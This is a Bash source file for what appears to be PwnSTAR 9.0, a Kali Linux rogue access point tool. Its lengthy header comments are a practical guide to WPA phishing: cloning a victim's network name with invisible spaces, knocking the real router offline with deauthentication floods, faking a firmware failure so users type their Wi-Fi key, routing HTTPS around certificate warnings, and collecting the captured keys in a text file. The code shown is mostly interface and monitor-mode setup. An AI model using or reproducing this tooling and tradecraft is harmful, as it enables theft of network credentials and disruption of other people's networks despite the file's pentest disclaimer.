#!/bin/bash

# PLEASE READ AND STUDY BEFORE LAUNCHING

# See the README.txt for hints on usage

# --------------------------------------------------------------------------------------------------------------------#
# v0.9- 07/4/2013
#
# Copyright (C) 2013  Vulpi

# This program is free software; you can redistribute it and/or modify it under the terms of the GNU General Public 
# License as published by the Free Software Foundation; either version 2 of the License, or any later version.
# This program is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY; without even the implied 
# warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the GNU General Public License for more details.
# You should have received a copy of the GNU General Public License along with this program; if not, write to the
# Free Software Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston, MA  02110-1301, USA.
# --------------------------------------------------------------------------------------------------------------------#

# Disclaimer:   This script is intended for use only for private study or during an authorised pentest. The author bears no responsibility for malicious or illegal use.
#               Skiddies should look elsewhere.


#  ===========================================================================================  #
# 				  "...On The Shoulders Of Giants..."                                            #
#  ===========================================================================================  #

# 		Large chunks copied directly from snafu777's quickset script                            #
#										                                                        #
#		I couldn't improve on his code, and gave up trying                                      #

#  ===========================================================================================  #
#
# --------------------------------------------------------------------------------------------------------------------#

# Indebted to everyone else who has contributed scripts to the wonderful community at BT Forums, especially:

#	    comaX
#	    ericmilam
#	    LHYX1
#	    deathcorps
#	    g0tmi1k
#	    killadaninja

# --------------------------------------------------------------------------------------------------------------------#

# Many thanks to all on the BackTrack forum who gave feedback.

# --------------------------------------------------------------------------------------------------------------------#
#   Prerequisites
   # ~~~~~~~~~~~~~ #

# I amused myself by playing with colours. You may get unexpected results if you have different terminal effects.
# In Eterm adjust the background settings: transparency off, pixmap none; then "save theme settings". This gives a blank background to show the script colours.
# In the shell, a plain black or white background works best.

# Designed for Kali-linux only. PwnSTAR_0.84 will run on BackTrack 5R2 and 5R3. It is assumed you have all standard tools installed.

# Additional requisites: incrontab (+ dhcp-server obviously). The script will install these. Can use airdrop-ng if you have it installed.

# Ignore "###" - this is note to self.

#   Bugs
  # ~~~~~~~~~~~~~ #
 
# If an invalid value is entered when setting up interfaces, the script sometimes loops and spawns mon1 or even mon2. I haven't managed to fix this: advice welcomed.
# This doesn't usually cause problems, but if concerned, then re-insert usb cards and start again, without fat-fingering the entry!

#   Setting up webserver
  # ~~~~~~~~~~~~~~~~~~~~ #

# The script uses a variable called "textfile". This refers to the simple file that the php writes to. 
# See my post on the BT forums for an example.
# Keep all related files (including the index) in a single directory eg "phishing". 
# Place the phishing directory into /var/www. Check permissions are correct.

# DO NOT place the index file separately into its usual position in /www; the script will copy it into position.
# This allows you to build up a number of phishing directories, with the index safely inside each of them. 
# Thus avoiding the risk of deleting the only copy from /www.


# Flames and praise welcome - kali forums http://forums.kali.org/forum.php

# Regards
# Vulpi

############################################################################################################
#
# Musket Team additions - WPA Phishing
#
#    This program supports Kali linux Rolling.  It contains a diverse number of Phishing and
#  DDOS processes. The setup can be lengthy especially if a WPA RogueAP Clone is established.
#  Because of the many setup pages and choices alot of error handeling routines have been
#  included in the package. In most cases if a wrong entry is made the user can select n/N and
#  correct the error rather then start the whole setup again.
#    Each attack has its own special setups. To allow flexabiltiy many steps and choices had  
#  to be added which may at times may seem unnecessary.
#
#    Eterm is not used - Ignore any Eterm comments. Xterm is used instead. The code and
#  comments have be left in place incase Eterm is used in the future.
#  
#    Eterm windows set by this version may be overwritten by any existing Eterm user.cfg file.
#  This program erases this file. If you want to keep these files save the file in root    
#  To restore your Eterm windows go to /usr/share/Eterm/themes/Eterm/user.cfg
#  If you do not want to keep it just erase or rename the user.cfg file.
#
#    Minimum Equipment Required(rqr) One(1) Wireless Device supporting Packet Injection
#      See help list for complete list     
#
#  Network Manager(NM) And Mac Addresses:
#
#     If internet access is provided then NM will conrol the device providing
#  this access. If you try and set a mac address thru the terminal window & macchanger, this 
#  mac address will be over-written by the cloned mac address setting in the NM drop-down
#  menus. Therefore, for the device providing internet access, set the cloned mac address
#  thru NM menus ONLY!!!  Devices providing the RogueAP are NOT conrolled by NM and will be
#  set thru program modules as required by the user.
#     New NM control pages allow the user to globally set the autoconnect, mac address
#  and randomized mac address choices in NM menus or files.
#
#     A lengthy series of new pages have been added to help keep the mac address, channel and
#  name selections in better administrative control. These pages attempt to assist the user to
#  choose entries correctly dependent on the type of Phishing and DDOS intended. Many prompts
#  and reminders have been added.
#
#     The program supports active and passive DDOS processes. See below for details.
#
# 
#    WPA Phishing pages
#
#    Apache2 in kali2.0 and 2016.R2 accesses the /var/www/html/ folder for web pages NOT the
#  /var/www/.folder.
#
#    The web folder included in this package
#
#
#	Used with dnsspoof
#      1. routerwpa1 (static)
#      2. routerwpa2 (static)
#      3  routerwpa3 (interactive)
#      4. routerwpa5 (interactive)
#      5. javawpa1 (static)
#      6. javawpa2 (interactive}
#      7. routerwpa6 (static)
#      8. routerwpa7 (static)
#      9. routerwpa8 (static)
#      10.WPAEnterprise
# 
#       Used with Captive Portal
#      1. routerwpa1access (static)
#      2. routerwpa2access (static)
#      3  routerwpa3access (interactive)
#      4. routerwpa5access (interactive)
#      5  javawpa1access (static)
#      6. javawpa2access (interactive)
#      7. routerwpa6access	
#      8. routerwpa8access


#  The original web page have been altered to meet Kali2.0 and higher rqr. They are:
#
#	Used with dnsspoof
#      1. hotspot_3
#
#
#      Used wih Captive Portal
#      1. portal_hotspotaccess
#      2. portal_simpleaccess 
#
#    The MTeam package comes with a web_page folder containing all folders listed
#  above.  Users can develop their own phishing pages. A basic understanding of the bash
#  coding in Pwnstar is required together with HTML 	AND php coding.
#
#    Place ALL these folders in the /var/www/ folder and DO NOT rename. The webpage folders are
#  static and interactive. Static cannot be altered. If you choose an interactive phishing
#  page you will be asked to enter info. This will be written into the webpage to make the
#  warning be in line with the targetAP type. You can read the warning and keep adjusting the
#  router name etc. till it is presentable. Expect these error messages to change each time as
#  two(2)random number generators inject nonsense into the text to represent unreadable data.
#  Once the program is running you can call up this webpage. Just enter 127.0.0.1 in your web
#  browser or click on the index.html file in each folder.
#    Webpage folder names ending in "access" use a captive portal and employ a service.php
#  file.
#    These access web pages are used when allowing internet access and allow HTTPS-HTTP traps.
#  Webpage folders with no "access" at the end of the name employ a process-form-data.php file,
#  provide weak to no internet access and use dnsspoof. The program copies all files in these
#  folders to the /var/www/html/ folder when selected.  However the php
#  file writes any username password data to the formdata.txt file in the web page folder
#  selected by the user.
#    Each web page folder has is own formdata.txt file which is never erased. Hence data
#  phished is not lost when the program clears the /var/www/html folder.
#
#    WPA Phishing Attack Portal Types versus equipment required.
#  
#  The PwnStar Menu Provides two(2) selections that can be used when Phishing:  
#
#    Method I   
#
#     Item 4) Simple web server with dnsspoof: This is easiest but less reliable.
#
#    Method II
#
#    Item 9 Advanced Menu a) Captive portals (phish/sniff): This provides the most reliable
#  rogueAP but it rqrs internet access be provided. This choice also allows the HTTPS-HTTP
#  trap to be used.
#
#    Stored keys provided by clients
#
#    The data the phish enters is stored in the tailed credentials file. Only the
#  formdata.txt file, located in the Web page subdirectory is supported. Each web
#  page folder has a formdata.txt file. Hence if you choose to use the hotspot web page folder,
#  look at the formdata.txt file in that folder for any code, key or username entered by the
#  phish. If you choose the wrong web page folder no data will be found in that
#  formdata.txt file as you are looking in the wrong folder not the wrong file.
#
#    Testing the functionality of the phishing system
#
#  Before starting a phishing operation test the system to make sure it is functioning.
#
#    Start Pwnstar item 4, no internet provided and use a second device to test the rogueAP.
#  A mobile phone can be used instead. Android phones have been used during program testing
#  and these phones worked fine as clients.
#
#   1. Using the client computer, look to see if the name of the rogueAP is seen. If no name  
#  seen shut down and try setting up the rogueAP again.
#   2. Once a client can associate to the rogueAP, try and bring up the phishing page.
#  Request a simple page like http://www.google.com. Do not use a https:.  If still
#  no phishing web page seen check the permissions for the folder. We find chmod 755 seems
#  to work for all web page folders and files execpt the formdata.txt files. Permissions
#  should not be a problem as they are set when the main program is run.
#   3. Once the phishing webpage is seen try entering data into the webpage and see if it is
#  saved to the formdata.txt file. If no data seen, the permissions for the formdata.txt are
#  wrong. Set the permissions for the formdata.txt file. Use chmod 777 allowing others to write
#  to the file. The program should set these permissions when you select to use them. And as
#  mentioned above make sure you check the file in the correct folder. Remember the web page
#  being used is in the /var/www/html folder. It is moved there during program setup. BUT the
#  formdata.txt file being written to is found in the web page folder NOT the /var/www/html
#  folder.
#    The files in the /var/www/html/ are set to chmod 755. All formdata.txt files are set to
#  chmod 777.  To see the permissions enter the below commands. Ignore the formdata.txt file
#  in the /var/www/html/ folder. This file is never used. 
#
#  cd /var/www/html/
#  ls -l
#
#  Client Access To Phishing Pages
#
#    If the computer sets a blank screen after being idle. Phishing pages may not be available
#  to the client if the blank screen is in residence. Therefore when Phishing go to Settings/
#  /Power/ select screen blank never.
#  
#  WPA Phishing - Special Considerations.
#
#    This approach tries to simulate a router firmware malfunction. Since the client router
#  has WPA encryption and the client computer also has the same key, you cannot name the
#  rogueAP with the same name as the target router. The WPA encryption on the clients
#  computer will prevent any association to the rogueAP. The only way the client can associate
#  to a open rogueAP of same name, is to remove the WPA setting. This is not something a client
#  would normally do. To allow the client to associate to the rogue, make a essid(ie rogueAP
#  name) that is similiar to the human eye but different to the computer. The best way we have
#  found is to use the exact same name and then add approximately five spaces and a dot. For
#  example if the target routers name (ESSID) is  "HOME WIFI" then use  "HOME WIFI     ."
#  Notice the five(5) spaces and a period. You can add more spaces but once you get past
#  approx eight(8) spaces, some wifi software do funny things to the name. If you add just
#  spaces with no character ending the string. some software just ignores the spaces.
#    When the name looks the same but is different to the computer, the client can choose to
#  associate to the rogueAP without having to enter a key. Another method is to use the
#  original name but embed the name with symbols and spaces again showing firmware corruption
#  For Example "HOME WIFI is now  HOME WI~ F.i~ /=/ ." The trick here is to not corrupt the
#  name to the point that the client cannot recognize it as their own wifi site. We prefer the
#  first suggestion.
#
#  HTTPS Requests When Internet Access is Provided:
#
#     DO NOT setup the ssl module in Apache2 with this Pwnstar version. This will cause
#   warnings sent to the client if a HTTPS is made and a self-signed certificate is provided.
#
#     This version of Pwnstar9.0  allows the user to handle HTTPS request in two(2) ways if
#  internet access to the client is provided thru the captive portal. 
#	Method 1(HTTPS-HTTP Trap)
#  1. If the client makes a HTTPS request, access to the internet is provided bypassing the
#  phishing page. BUT if a HTTP request is made, then the phishing page is seen. There is no
#  HTTPS certificate warning. Even clients using android phones can access the internet until
#  any HTTP request is made then the phishing page in brought up.
#	Method 2
#  2. Nothing occurs if a HTTPS request is made. If a HTTP request is made then the phishing
#  page appears in the clients computer.
#
#	This is a social engineering decision. Method 1 seems to go well with WPA phishing.
#  Activating HTTPS with a self-signed certificate is not the answer as it causes warnings in
#  the web browser.
#
#   When choosing 9a, internet access works very well. However choosing 4, internet access is
#  poor to not functional. 
#
#  Channel Setups and Mdk3, Aireplay-ng deauth - Transmission Interference.
#
#     Once your rogueAP is setup you must shutdown the targetAP thru a DDOS process. This can
#  be done two(2) ways using mdk3 or aireplay-ng. A DDOS menu selection will be seen once PS9
#  is running. A passive DDOS process using airbase-ng is also offered and explained below.
#
#   If Setting Up a Open Hotspot(i.e. Not WPA Phishing) 
#
#     Use same channel and possibly the same mac address. The intensity of DDOS use
#  determines whether a different channel/different mac address needs to be employed.
#
#  Active DDOS Types:
# 
#    The program sets up monitors automatically. Do not attempt to setup a monitor thru the
#  terminal window(TW) with airmon-ng unless the older version is used. PS9 allows three types
#  of DDOS to be performed aireplay-0 and mdk3 d or g.
#     This may block the ability of a client to connect to the rogueAP and may also sever an
#  internet connection. If the DDOS signal disrupts the rogueAPs' ability to function you may
#  have to setup the rogueAP on a different channel from the targetAP and employ an additional
#  wifi device to perform the DDOS.
#     If WPA Phishing DONOT USE aireplay-ng where you --deauth only a single specific
#  client from the targetAP. You are trying to simulate a router malfunction. If one client
#  cannot associate and another client is not affected then this would point to a problem
#  with the client not the router. Remember two clients might be sitting next to one another.
#
#   Passive DDOS Types:
#
#    This program allows the use of airbase-ng to passively DDOS a WPA encrypted network. A
#  WPA encrypted rogueAP clone of the target network is setup with the exact same essid, bssid
#  and channel as the targetAP. Clients can attempt to associate to this device but association
#  is impossible. This rogueAP clone can mask the targeAP  preventing a client from obtaining
#  an association to the targetAP. Effectiveness of this blockage is predicated on relative
#  signal strengths between the targetAP, rougueAP clone and client. Clients already
#  associated to the targetAP must be deauthed from the targetAP. The existance of the rogueAP
#  clone then hinders the association/reassociation process. It doesnot affect any client that
#  has established association to the target AP.
#
#     Bugs  When tail is run a unrecognized filesystem warning may occur in the xterm
#  window. This is caused by a OverlayFS problem and DOESNOT affect any processes so ignore
#  it. 
#
#    Further reading - suggest you consult pwnstar9.0 threads in the kali-linux forums.
#    See https://www.sensepost.com/blog/9460.html for rogueAP setups.
#
#     Send any praise to the original author Vulpi - we do. Please direct any burning at
#  Musket Teams - we really do not mind.
#
#############################################################################################################
#
#  Programmers Opening Notes = lot of dead dna is left as some like Eterm may be brought back
#  if ever functions in kali 2.0 or 2016.
# Speed Test
# wget --output-document=/dev/null http://speedtest.wdc01.softlayer.com/downloads/test500.zip
#
# wget -O - http://raw.github.com/sivel/speedtest-cli/master/speedtest_cli.py | python
#
#
#
#
# Functions
# airmon-old_fn

#~~~~~~~~~~~~~~~~Start DNSRESPOND_fn Start~~~~~~~~~~~~~~~~#
#  To keep and monitor availablilty of the interent thru the captive
#  portal when 9a or 3 is running a constant ping request is made
#  Without this 

DNSRESPOND_fn()
{


kill -9 $responsepid &> /dev/null

	if [[ $ping1 == 1 ]]; then

# Move to upper left-hand corner if at beginning setup

xterm -g xterm -g 80x5-0+0 -T "DNS Response Test" -e "while true; do ping -c 1 www.google.com; killall -q ping; sleep 1; ping -c 1 www.facebook.com; killall -q ping; sleep 1; done" 2> /dev/null & responsepid=$!

	else

xterm -g 80x5+60-0 -T "DNS Response Test" -e "while true; do ping -c 1 www.google.com; killall -q ping; sleep 1; ping -c 1 www.facebook.com; killall -q ping; sleep 1; done" 2> /dev/null & responsepid=$!

	fi



}

#~~~~~~~~~~~~~~~~Start DNSRESPOND_fn Start~~~~~~~~~~~~~~~~#

#~~~~~~~~~~~~~~~~Start TESTCON_fn Start~~~~~~~~~~~~~~~~#
# This fn checks internet connection both ICI to DNS and DNS to internet

TESTCON_fn()

{

 if [[ $internet == "y" ]]; then

constat=
sleep 1
	constat=$(iwconfig $ICI | grep $ICI | awk '{ print $4 }')

	if [[ $constat == ESSID:off/any ]] && [[ $internet == "y" ]]; then
	
	echo -e "$warn     Possible loss of internet connection."
	echo -e "$info  Network Manager. If no association the rogueAP will not function."
	echo -e "$info  Connection Information seen below:$txtrst"
	echo ""
	iwconfig $ICI | grep $ICI
	cat </etc/resolv.conf
	echo""
	echo -e "$info     If no internet connection seen suggest rebooting computer,"
        echo -e "  reconnect to internet, restart PwnStar 9.0. Connection status seen"
	echo -e "  thru Network Manager unreliable, and Network Manager can become"
	echo -e "  unresponsive especially after airmon-ng check kill.$txtrst"

	else

	cat </etc/resolv.conf



		fi

#	DNSONLINE=$(cat /sys/class/net/$ICI/carrier)

#       if [[ $constat != ESSID:off/any ]] && [[ $DNSONLINE == 0 ]]; then

#	echo ""
#	echo -e "$yel                           !!!!!$warn WARNING$yel!!!!!"
#	echo -e "$info     Interface$yel $ICI$info may be associated to a network"
#	echo -e "$info  but DNS access to internet has failed. In this case internet"
#	echo -e "$info  web pages are not available. If you are sure the network providing"
#       echo -e "$info  internet access is functioning then the network manager connection."
#	echo -e "$info  needs to be reinitialized. DO NOT reset Network Manager. Open"
#	echo -e "$info  Network Manager go to wifi settings. Choose a different connection"
#	echo -e "$info  then return to the original network, Then retest."
#	echo ""

#	fi

#        if [[ $constat != ESSID:off/any ]] && [[ $DNSONLINE == 1 ]]; then

#	echo -e "$info       Checking DNS Access to internet"
#echo ""
#echo -ne "$warn."; sleep .1; echo -ne "$info."; sleep .1; echo -ne "$yel."; sleep .1; echo -ne "$txtrst."; sleep .1; echo -ne "$warn."; sleep .1; echo -ne "$info."; sleep .1; echo -ne "$yel."; sleep .1; echo -ne "$txtrst."; sleep .1; echo -ne "$warn."; sleep .1; echo -ne "$info."; sleep .1;echo -ne "$yel."; sleep .1; echo -ne "$txtrst."; echo -ne "$warn."; sleep .1; echo -ne "$info."; sleep .1;echo -ne "$yel."; sleep .1; echo -ne "$txtrst."; echo -ne "$warn."; sleep .1; echo -ne "$info."; sleep .1;echo -ne "$yel."; sleep .1; echo -e "$txtrst.";
#echo ""
#	echo -e "$info     DNS access to internet is functioning"
#	echo -e "$txtrst     *************************************"

#	fi

		fi

}

#~~~~~~~~~~~~~~~~End TESTCON_fn End~~~~~~~~~~~~~~~~#

#~~~~~~~~~~~~~~~~Start AUTOCON_fn() Start~~~~~~~~~~~~~~~~#

AUTOCON_fn()

{

clear
echo ""
echo ""
echo -e "$info$bold                    Network-Manager Settings$warn"
echo -e "                    $undr                                $norm"
echo ""                  
echo -e "$info     A method of$yel NOT$info employing the$yel airmon-ng check kill$info command has"
echo -e "$info  been developed for users of Kali 2.0 and 2016.1R. This allows the user to"
echo -e "$info  keep NetworkManager functioning on other devices as required."
echo -e "$info  .  For this method to function, you must uncheck the$yel connect"
echo -e "$yel  automatically$info selection thru the Network Manager drop-down menus, for all"
echo -e "$info  ESSIDs selected for use with $API the device being used by the RogueAP."
echo -e "$info  Stations setup on other devices DO NOT need to be altered. If Network-"
echo -e "$info  Manager has no ESSID to automatically connect to, then no disruption"
echo -e "$info  of $API will occur"

echo ""
echo -e "$inp   Enter any key when ready to confinue...."

	read continue
	
}

#~~~~~~~~~~~~~~~~End AUTOCON_fn() End~~~~~~~~~~~~~~~~#

###################
IFCONFIG_TYPE_fn()
{
# Note text output for kali2016rolling has been altered
# Any routines requiring the use of text output must be altered
# Written as fn for portability into other MTeam prog.
# This tests ifconfig output

iftype=ZZZ

iftype=$(ifconfig -a | grep -e wlan -e eth -e ath | awk '{if (($1 == "ether") || (substr($1,length($1),1) == ":")) {print "ether";exit;}}')

	if [[ $iftype == "ether" ]]; then

		ifselect=new

	else

		ifselect=old

		fi

}

clear
KALI_L_fn()
{

clear
echo -e ""
echo -e ""
echo -e "$bold$info  Kali-Linux Operating System"
echo -e "$warn  ____________________________$norm"
echo ""
echo -e "$info     Program supports Kali-Linux Rolling ONLY!!!"

KALI_TYPE=3
echo ""
echo -e "$info     Note: Kali-light, Luks encryption, and  ARM are$warn NOT$info supported."
echo ""
echo -e "$inp  Enter any key to continue ......"
read continue

}

#~~~~~~~~~~~~~~~~~~start  airmon-ng old  start~~~~~~~~~~~~~~~~~#
airmon-old_fn()

{
#!/bin/sh

USERID=""
IFACE=""
KISMET=/etc/kismet/kismet.conf
CH=$3; [ x$3 = "x" ] && CH=10
IFACE_FOUND="false"
MADWIFI=0
MAC80211=0
USE_IW=0
IW_SOURCE="http://wireless.kernel.org/download/iw/iw-0.9.15.tar.bz2"
IW_ERROR=""
UDEV_ISSUE=0

if [ -f "`which iw 2>&1`" ]
then
	USE_IW=1
fi

if [ "x$MON_PREFIX"="x" ]
then
MON_PREFIX="mon"
fi

PROCESSES="wpa_action\|wpa_supplicant\|wpa_cli\|dhclient\|ifplugd\|dhcdbd\|dhcpcd\|NetworkManager\|knetworkmanager\|avahi-autoipd\|avahi-daemon\|wlassistant\|wifibox"
PS_ERROR="invalid"

usage() {
	printf "usage: `basename $0` <start|stop|check> <interface> [channel or frequency]\n"
	echo
	exit
}

startStdIface() {
	iwconfig $1 mode monitor >/dev/null 2>&1
	if [ ! -z $2 ]
	then
	    if [ $2 -lt 1000 ]
	    then
		iwconfig $1 channel $2 >/dev/null 2>&1
	    else
		iwconfig $1 freq "$2"000000 > /dev/null 2>&1
	    fi
	fi
	iwconfig $1 key off >/dev/null 2>&1
	ifconfig $1 up
	printf " (monitor mode enabled)"
}


stopStdIface() {
	ifconfig $1 down >/dev/null 2>&1
	iwconfig $1 mode Managed >/dev/null 2>&1
	ifconfig $1 down >/dev/null 2>&1
	printf " (monitor mode disabled)"
}

getModule() {
    if [ -f "/sys/class/net/$1/device/driver/module/srcversion" ]
    then
        srcver1=`cat "/sys/class/net/$1/device/driver/module/srcversion"`
        for j in `lsmod | awk '{print $1}' | grep -v "^Module$"`
        do
            srcver2="`modinfo $j 2>/dev/null | grep srcversion | awk '{print $2}'`"
            if [ $srcver1 = "$srcver2" ]
            then
                MODULE=$j
                break
            fi
        done
    else
        MODULE=""
    fi
#    return 0
}

getDriver() {
   if [ -e "/sys/class/net/$1/device/driver" ]
   then
       DRIVER="`ls -l "/sys/class/net/$1/device/driver" | sed 's/^.*\/\([a-zA-Z0-9_-]*\)$/\1/'`"
       BUS="`ls -l "/sys/class/net/$1/device/driver" | sed 's/^.*\/\([a-zA-Z0-9_-]*\)\/.*\/.*$/\1/'`"
   else
       DRIVER=""
       BUS=""
   fi
   if [ x$(echo $DRIVER | grep ath5k) != "x" ]
   then
       DRIVER="ath5k"
   fi
   if [ x$(echo $DRIVER | grep ath9k) != "x" ]
   then
       DRIVER="ath9k"
   fi
}

scanProcesses() {
    match=`ps -A -o comm= | grep $PROCESSES | grep -v grep | wc -l`
    if [ $match -gt 0 -a x"$1" != xkill ]
    then
        printf "\n\n"
        echo "Found $match processes that could cause trouble."
        echo "If airodump-ng, aireplay-ng or airtun-ng stops working after"
        echo "a short period of time, you may want to kill (some of) them!"
        echo -e "\nPID\tName"
    else
        if [ x"$1" != xkill ]
        then
            return
        fi
    fi

    if [ $match -gt 0 -a x"$1" = xkill ]
    then
        echo "Killing all those processes..."
    fi

    i=1
    while [ $i -le $match ]
    do
        pid=`ps -A -o pid= -o comm= | grep $PROCESSES | grep -v grep | head -n $i | tail -n 1 | awk '{print $1}'`
        pname=`ps -A -o pid= -o comm= | grep $PROCESSES | grep -v grep | head -n $i | tail -n 1 | awk '{print $2}'`
        if [ x"$1" != xkill ]
        then
            printf "$pid\t$pname\n"
        else
            kill $pid
        fi
        i=$(($i+1))
    done
}

checkProcessesIface() {
    if [ x"$1" = x ]
    then
        return
    fi

    match2=`ps -o comm= -p 1 2>&1 | grep $PS_ERROR | grep -v grep | wc -l`
    if [ $match2 -gt 0 ]
    then
	return
    fi

    for i in `ps auxw | grep $1 | grep -v "grep" | grep -v "airmon-ng" | awk '{print $2}'`
    do
        pname=`ps -o comm= -p $i`
        echo "Process with PID $i ($pname) is running on interface $1"
    done
}

getStack() {
    if [ x"$1" = x ]
    then
        return
    fi

    if [ -d /sys/class/net/$1/phy80211/ ]
    then
        MAC80211=1
    else
        MAC80211=0
    fi
}

#you need to run getDriver $iface prior to getChipset
getChipset() {
    if [ x"$1" = x ]
    then
        return
    fi

    CHIPSET="Unknown "

    if [ x$DRIVER = "xOtus" -o x$DRIVER = "xarusb_lnx" -o x$DRIVER = "xar9170" ]
    then
	CHIPSET="AR9001U"
    fi

    if [ x$DRIVER = "xzd1211rw" -o x$DRIVER = "xzd1211rw_mac80211" ]
    then
        CHIPSET="ZyDAS 1211"
    fi

    if [ x$DRIVER = "xacx" -o x$DRIVER = "xacx-mac80211" -o x$DRIVER = "xacx1xx" ]
    then
        CHIPSET="TI ACX1xx"
    fi

    if [ x$DRIVER = "adm8211" ]
    then
        CHIPSET="ADMtek 8211"
    fi

    if [ x$DRIVER = "xat76_usb" ]
    then
        CHIPSET="Atmel   "
    fi

    if [ x$DRIVER = "xb43" -o x$DRIVER = "xb43legacy" -o x$DRIVER = "xbcm43xx" ]
    then
        CHIPSET="Broadcom"
    fi

    if [ x$DRIVER = "xprism54" -o x$DRIVER = "xp54pci" -o x$DRIVER = "xp54usb" ]
    then
        CHIPSET="PrismGT "
    fi

    if [ x$DRIVER = "xhostap" ]
    then
        CHIPSET="Prism 2/2.5/3"
    fi

    if [ x$DRIVER = "xr8180" -o x$DRIVER = "xrtl8180" ]
    then
        CHIPSET="RTL8180/RTL8185"
    fi

    if [ x$DRIVER = "xr8187" -o x$DRIVER = "xrtl8187" ]
    then
        CHIPSET="RTL8187 "
    fi

    if [ x$DRIVER = "xrt2570" -o x$DRIVER = "xrt2500usb" ]
    then
        CHIPSET="Ralink 2570 USB"
    fi

    if [ x$DRIVER = "xrt2400" -o x$DRIVER = "xrt2400pci" ]
    then
        CHIPSET="Ralink 2400 PCI"
    fi

    if [ x$DRIVER = "xrt2500" -o x$DRIVER = "xrt2500pci" ]
    then
        CHIPSET="Ralink 2560 PCI"
    fi

    if [ x$DRIVER = "xrt61" -o x$DRIVER = "xrt61pci" ]
    then
        CHIPSET="Ralink 2561 PCI"
    fi

    if [ x$DRIVER = "xrt73" -o x$DRIVER = "xrt73usb" ]
    then
        CHIPSET="Ralink 2573 USB"
    fi

    if [ x$DRIVER = "xipw2100" ]
    then
        CHIPSET="Intel 2100B"
    fi

    if [ x$DRIVER = "xipw2200" ]
    then
        CHIPSET="Intel 2200BG"
    fi

    if [ x$DRIVER = "xipw3945" -o x$DRIVER = "xipwraw" -o x$DRIVER = "xiwl3945" ]
    then
        CHIPSET="Intel 3945ABG"
    fi

    if [ x$DRIVER = "xipw4965" -o x$DRIVER = "xiwl4965" ]
    then
        CHIPSET="Intel 4965AGN"
    fi

    if [ x$DRIVER = "xiwlagn" ]
    then
        CHIPSET="Intel 4965/5xxx"
    fi

    if [ x$DRIVER = "xath_pci" -o x$DRIVER = "xath5k" -o x$DRIVER = "xath9k" ]
    then
        CHIPSET="Atheros "
    fi

    if [ x$DRIVER = "xorinoco" ]
    then
        CHIPSET="Hermes/Prism"
    fi
}

getPhy() {
    PHYDEV=""
    if [ x"$1" = x ]
    then
        return
    fi

    if [ x$MAC80211 = "x" ]
    then
        return
    fi

    PHYDEV="`ls -l "/sys/class/net/$1/phy80211" | sed 's/^.*\/\([a-zA-Z0-9_-]*\)$/\1/'`"
}

getNewMon() {
    i=0

    while [ -d /sys/class/net/$MON_PREFIX$i/ ]
    do
        i=$(($i+1))
    done

    MONDEV="$MON_PREFIX$i"
}

if [ x"`which id 2> /dev/null`" != "x" ]
then
	USERID="`id -u 2> /dev/null`"
fi

if [ x$USERID = "x" -a x$UID != "x" ]
then
	USERID=$UID
fi

if [ x$USERID != "x" -a x$USERID != "x0" ]
then
	echo Run it as root ; exit ;
fi

iwpriv > /dev/null 2> /dev/null ||
  { echo Wireless tools not found ; exit ; }

if [ x"$1" = xcheck ] || [ x"$1" = xstart ]
then
    scanProcesses
    for iface in `iwconfig 2>/dev/null | egrep '(IEEE|ESSID|802\.11|WLAN)' | sed 's/^\([a-zA-Z0-9_]*\) .*/\1/' | grep -v wifi`
    do
#         getModule $iface
#         getDriver $iface
        checkProcessesIface $iface
    done

    if [ x"$2" = xkill ]
    then
        scanProcesses "$2"
    fi
    if [ x"$1" = xcheck ]
    then
        exit
    fi
fi

printf "\n\n"

if [ $# -ne "0" ]
then
    if [ x$1 != "xstart" ] && [ x$1 != "xstop" ]
    then
        usage
    fi

    if [ x$2 = "x" ]
    then
        usage
    fi
fi

SYSFS=0
if [ -d /sys/ ]
then
    SYSFS=1
fi

printf "Interface\tChipset\t\tDriver\n\n"


for iface in `ifconfig -a 2>/dev/null | egrep UNSPEC | sed 's/^\([a-zA-Z0-9_]*\) .*/\1/'`
do

 if [ x"`iwpriv $iface 2>/dev/null | grep ipwraw-ng`" != "x" ]
 then
        printf "$iface\t\tIntel 3945ABG\tipwraw-ng"
        if [ x$1 = "xstart" ] && [ x$2 = x$iface ]
        then
                cp $KISMET~ $KISMET 2>/dev/null &&
                echo "source=ipw3945,$iface,Centrino_abg" >>$KISMET
                startStdIface $iface $CH
                iwconfig $iface rate 1M 2> /dev/null >/dev/null
                iwconfig $iface txpower 16 2> /dev/null >/dev/null
        fi
        if [ x$1 = "xstop" ] && [ x$2 = x$iface ]
        then
                stopStdIface $iface
                iwconfig $iface txpower 15 2> /dev/null >/dev/null
                iwconfig $iface rate 54M 2> /dev/null >/dev/null
        fi
        echo
        continue
 fi

 if [ -e "/proc/sys/dev/$iface/fftxqmin" ]
 then
    MADWIFI=1
    ifconfig $iface up
    printf "$iface\t\tAtheros\t\tmadwifi-ng"
    if [ x$1 = "xstart" ] && [ x$2 = x$iface ]
    then
        IFACE=`wlanconfig ath create wlandev $iface wlanmode monitor -bssid | grep ath`
        cp $KISMET~ $KISMET 2>/dev/null &&
        echo "source=madwifi_g,$iface,Atheros" >>$KISMET
        ifconfig $iface up 2>/dev/null >/dev/null
        if [ $CH -lt 1000 ]
        then
            iwconfig $IFACE channel $CH 2>/dev/null >/dev/null
        else
            iwconfig $IFACE freq "$CH"000000 2>/dev/null >/dev/null
        fi
        ifconfig $IFACE up 2>/dev/null >/dev/null
        UDEV_ISSUE=$?
    fi
    if [ x$1 = "xstop" ] && [ x$2 = x$iface ]
    then
            echo "$iface does not support 'stop', do it on ath interface"
    fi
    echo
    continue
 fi
done

if [ $MADWIFI -eq 1 ]
then
	sleep 1s
fi

for iface in `iwconfig 2>/dev/null | egrep '(IEEE|ESSID|802\.11|WLAN)' | sed 's/^\([a-zA-Z0-9_]*\) .*/\1/' | grep -v wifi`
do
 getModule  $iface
 getDriver  $iface
 getStack   $iface
 getChipset $DRIVER


 if [ x$MAC80211 = "x1" ]
 then
    getPhy $iface
    getNewMon
    printf "$iface\t\t$CHIPSET\t$DRIVER - [$PHYDEV]"
    if [ x$1 = "xstart" ] && [ x$2 = x$iface ]
    then
        if [ $USE_IW = 1 ]
        then
            IW_ERROR=`iw dev $iface interface add $MONDEV type monitor 2>&1 | grep "nl80211 not found"`
            if [ x$IW_ERROR = "x" ]
            then
                sleep 1s
		if [ ! -z $3 ]
                then
            	    if [ $3 -lt 1000 ]
            	    then
                	iwconfig $MONDEV channel $3 >/dev/null 2>&1
            	    else
                	iwconfig $MONDEV freq "$3"000000 >/dev/null 2>&1
            	    fi
            	fi
                ifconfig $MONDEV up
